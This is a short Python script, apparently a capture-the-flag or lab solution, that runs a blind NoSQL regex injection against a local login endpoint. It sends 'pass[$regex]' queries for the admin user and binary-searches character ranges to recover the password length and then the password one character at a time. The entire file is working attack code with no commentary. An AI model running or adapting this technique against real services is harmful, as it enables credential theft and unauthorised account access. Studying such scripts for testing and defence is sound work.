import requests
import urllib.parse

def query(q):
    res = requests.get(r"http://127.0.0.1:8791/?user=admin&pass[$regex]=" + q)
    if "Success" in res.text:
        return True
    else:
        return False

def binary_search(left, right, query_s, query_f, v=1):
    while right - left > 3: # <= 3 will stop
        guess = int(left+(right-left)/2)
        if query(query_s % guess):
            left = guess
        else:
            right = guess

    for i in range(left,right): # do match
        if query(query_f % i):
            if v == 1:
                return i

def get_len():
    return binary_search(1,100,
        "^.{%s,}$",
        "^.{%s}$")


def binary_search_content(index=0, length=1, left=1, right=0x7f,):
    while right - left > 4:
        guess = int(left+(right-left)/2)
        
        old_left = left
        left = guess
        command = urllib.parse.quote(r"^.{%s}[\x{%s}-\x{%s}].{%s}" % (index, f"{hex(int(left))[2:]:0>4}", f"{hex(int(right))[2:]:0>4}", length-index-1))
        if query(command):
            left = guess
        else:
            right = guess
            left = old_left
        print(f"{left} ~ {right}" , end="\r")

    for i in range(left,right+1):
        command = urllib.parse.quote(r"^.{%s}[\x{%s}].{%s}" % (index, f"{hex(int(i))[2:]:0>4}", length-index-1))
        # print(command)
        if query(command):
            print(f"[!] Answer: {i} ({chr(i)})")
            return i

length = get_len()
print(f"String Length = {length}")

r = []
for i in range(length):
    r.append(chr(binary_search_content(index=i,length=length)))

print(''.join(r))

